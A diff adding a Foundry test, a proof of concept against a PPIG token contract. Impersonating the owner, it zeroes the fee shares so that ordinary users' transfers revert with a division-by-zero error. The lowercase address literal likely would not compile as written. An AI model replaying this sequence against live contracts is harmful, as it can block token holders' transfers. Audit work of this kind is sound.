@@ -1,0 +1,72 @@
+```solidity
+// SPDX-License-Identifier: Unlicense
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IPPIG {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function minimumTokensBeforeSwapAmount() external view returns (uint256);
+    function setShares(uint256 _marketingShareNew, uint256 burnShareNew) external;
+    function setNumTokensBeforeSwap(uint256 newLimit) external;
+    function totalSupply() external view returns (uint256);
+    function isExcludedFromFee(address) external view returns (bool);
+    function isMarketPair(address) external view returns (bool);
+    function swapAndLiquifyEnabled() external view returns (bool);
+    function swapAndLiquifyByLimitOnly() external view returns (bool);
+}
+
+contract ExploitTest is Test {
+    address constant PPIG_ADDR = 0x3fd7ee4a8ae0389763b080c871e1827b167c3cbd;
+    IPPIG ppig;
+    address owner;
+    address user1;
+    address user2;
+
+    function setUp() public {
+        ppig = IPPIG(PPIG_ADDR);
+        owner = ppig.owner();
+        user1 = address(0x1001);
+        user2 = address(0x1002);
+        vm.label(PPIG_ADDR, "PPIG");
+        vm.label(owner, "Owner");
+        vm.label(user1, "User1");
+        vm.label(user2, "User2");
+    }
+
+    function testZeroDivisionOnSwapAndLiquify() public {
+        // 1. Temporarily disable automatic swap by setting a very high minimum
+        uint256 originalMin = ppig.minimumTokensBeforeSwapAmount();
+        uint256 totalSupply = ppig.totalSupply();
+        uint256 highMin = totalSupply + 1;
+
+        vm.prank(owner);
+        ppig.setNumTokensBeforeSwap(highMin);
+
+        // 2. Transfer tokens from owner to contract to ensure contract balance > original minimum
+        uint256 fundAmount = originalMin * 2; // 40 * 10^9 tokens
+        vm.prank(owner);
+        ppig.transfer(PPIG_ADDR, fundAmount);
+
+        // 3. Give some tokens to user1 for later transfer
+        vm.prank(owner);
+        ppig.transfer(user1, 1000 * 1e9);
+
+        // 4. Owner sets both shares to zero -> totalDistributionShares = 0
+        vm.prank(owner);
+        ppig.setShares(0, 0);
+
+        // 5. Restore original minimum to enable swap on next non-excluded transfer
+        vm.prank(owner);
+        ppig.setNumTokensBeforeSwap(originalMin);
+
+        // 6. Trigger a transfer from a non-excluded, non-market-pair account (user1) to another address (user2)
+        // Conditions for swap: contract balance >= min, sender not market pair, swap enabled, recipient != owner
+        vm.expectRevert("SafeMath: division by zero");
+        vm.prank(user1);
+        ppig.transfer(user2, 1);
+    }
+}
+```
